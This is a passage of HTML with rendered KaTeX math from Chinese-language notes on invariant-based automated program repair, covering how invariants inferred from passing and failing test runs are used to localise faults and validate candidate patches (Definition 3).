style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq></li><li>上式中，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>L</mi></mrow><annotation encoding="application/x-tex">FL</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">L</span></span></span></span></eq> 是基于不变量的错误定位，</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>G</mi><mi>V</mi></mrow><annotation encoding="application/x-tex">PGV</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">PG</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></eq> 是使用测试套件进行补丁生成和验证过程</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>V</mi></mrow><annotation encoding="application/x-tex">FV</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></eq> 表示使用验证工具V进行正式补丁验证的过程。<ul><li>如果未找到合理的补丁，或者找到的补丁是不正确的，则修复过程返回失败。</li><li>如果合理的补丁通过了工具V执行的验证步骤，该过程将返回一个补丁</li></ul></li></ul></li><li><p>接下来讨论如何通过分析使用通过和失败的测试运行程序P产生规范 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{correct}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{violated}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>，对无故障和有故障运行的分析产生了以下模式</p><ul><li><ol><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mrow><mi>g</mi><mi>o</mi><mi>o</mi><mi>d</mi></mrow></msub><mo>=</mo><mi>V</mi><mo stretchy="false">(</mo><mi>D</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><msub><mi>T</mi><mi>P</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi_{correct} = \mathcal{I}_{good}=V(D(P,T_P))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">oo</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">))</span></span></span></span></eq>,只是用成功运行推断不变量，这些不变量表示程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 的预期行为</li></ol></li><li><ol start="2"><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>f</mi><mi>a</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi>y</mi></mrow></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mrow><mi>m</mi><mi>i</mi><mi>x</mi></mrow></msub><mo>=</mo><mi>V</mi><mo stretchy="false">(</mo><mi>D</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><msub><mi>T</mi><mi>F</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi_{faulty} = \mathcal{I}_{mix}=V(D(P,T_F))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">lt</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">mi</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">))</span></span></span></span></eq>,使用失败运行推断不变量，注意到 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mrow><mi>m</mi><mi>i</mi><mi>x</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_{mix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">mi</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 可能同时包含好的和坏的模式，这取决于目标错误如何影响 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 的不同功能。</li></ol></li><li><ol start="3"><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mrow><mi>m</mi><mi>i</mi><mi>x</mi></mrow></msub><mi mathvariant="normal">/</mi><msub><mi mathvariant="script">I</mi><mrow><mi>g</mi><mi>o</mi><mi>o</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{violated} = \mathcal{I}_{mix} / \mathcal{I}_{good}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">mi</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">oo</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>, 与错误相关的违反不变量的集合</li></ol></li></ul></li><li><p>将推断的不变量分类和区分为好的和坏的模式是很重要的，特别是在处理有多个功能要求的程序时。</p><ul><li>这将有助于在修改代码时确定要维持的期望不变量集合和要修复的冲突的不变量集合。</li><li>同时也将帮助识别与分析bug相关的不变量集合</li></ul></li><li><p>推断出的 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{correct}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{violated}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 的准确性很大程度上取决于所使用不变量推断工具的准确性和不变量精炼过程的准确性，通过可达性分析增加程序行为的覆盖范围，可以增加 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{correct}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{violated}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 为真的可能性</p></li></ul><h4 id="definition-3-%EF%BC%88patch-validation-in-invariant-based-apr%EF%BC%89" tabindex="-1">Definition 3 （Patch validation in invariant-based APR）</h4><ul><li><p>令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 为一个包括 bug <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span></eq> 的程序，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq> 是一个包含至少一个失败测试和一个正确测试的测试套件。 假设 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">pt</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">pt</span></span></span></span></eq> 是一个合理的补丁使得 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 通过了 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq> 中的所有测试用例。 补丁 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">pt</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">pt</span></span></span></span></eq> 的有效性可以按照以下形式进行检查 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>i</mi><mi>d</mi><mi>i</mi><mi>t</mi><mi>y</mi><mo>=</mo><mi>V</mi><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mo separator="true">,</mo><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub><mo stretchy="false">)</mo><mo>∧</mo><mi mathvariant="normal">¬</mi><mi>V</mi><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mo separator="true">,</mo><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">validity = V(pt,\varphi_{correct}) \wedge \neg V(pt,\varphi_{violated})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal">pt</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">¬</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal">pt</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section> 其中 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mo separator="true">,</mo><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub><mo stretchy="false">)</mo><mo>∈</mo><mo stretchy="false">{</mo><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi><mo separator="true">,</mo><mi>f</mi><mi>a</mi><mi>l</mi><mi>s</mi><mi>e</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">V(pt,\varphi_{correct}) \in \{true,false\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal">pt</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span 